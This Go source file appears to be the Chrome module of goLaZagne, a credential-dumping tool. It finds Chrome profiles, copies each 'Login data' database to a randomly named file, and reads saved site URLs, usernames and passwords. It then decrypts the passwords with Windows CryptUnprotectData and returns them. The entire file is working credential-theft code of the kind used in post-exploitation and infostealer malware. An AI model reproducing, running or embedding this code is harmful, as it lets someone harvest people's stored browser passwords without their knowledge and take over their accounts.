package browsers

import (
	"os"
	"io/ioutil"
	"github.com/buger/jsonparser"
	"fmt"
	"database/sql"
	"goLaZagne/common"
)

var (
	chromePathsUserData = []string{
		common.UserHome +"\\Local Settings\\Application Data\\Google\\Chrome\\User Data",
		common.AppData+"\\Google\\Chrome\\User Data",
	}
)

func ChromeModuleStart(path string) ([]common.CredentialsData, bool){
	if _, err := os.Stat(path + "\\Local State"); err == nil {
		fileWithUserData, err := ioutil.ReadFile(path + "\\Local state")
		if err != nil {
			return nil, false
		}
		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")

		var profileNames []string
		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
			profileNames = append(profileNames, string(key))
			return nil
		}, "info_cache")


		var temporaryDbNames []string
		for i:= range profileNames{
			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileNames[i])
			if _, err := os.Stat(dbPath); err == nil {
				randomDbName := common.RandStringRunes(10)
				err := common.CopyFile(dbPath, randomDbName)
				if err != nil{
					return nil, false
				}
				temporaryDbNames = append(temporaryDbNames, randomDbName)
			}
		}

		for dbNum := range temporaryDbNames{
			db, err := sql.Open("sqlite3", temporaryDbNames[dbNum])
			if err != nil {
				//log.Panic(err.Error())
				return nil, false
			}
			rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
			if err != nil {
				return nil, false
			}
			var actionUrl, username, password string
			var data []common.CredentialsData
			for rows.Next(){
				rows.Scan(&actionUrl, &username, &password)
				//data = append(data, fmt.Sprintf("%s %s %s", actionUrl, username, common.Win32CryptUnprotectData(password, false)))
				data = append(data, common.CredentialsData{actionUrl, username, common.Win32CryptUnprotectData(password, false)})
			}

			return data, true
		}
	}
	return nil, false
}

func ChromeExtractDataRun() common.ExtractDataResult{
	var Result common.ExtractDataResult
	var EmptyResult = common.ExtractDataResult{false,Result.Data}
	for i:=range chromePathsUserData {
		if _, err := os.Stat(chromePathsUserData[i]); err == nil {
			var data, success = ChromeModuleStart(chromePathsUserData[i])
			if success && data != nil{
				Result.Data = append(Result.Data, data...)
			} else {
				return EmptyResult
			}
		}
		if len(Result.Data) == 0 {
			return EmptyResult
		} else {
			Result.Success = true
			return Result
		}
	}
	return EmptyResult
}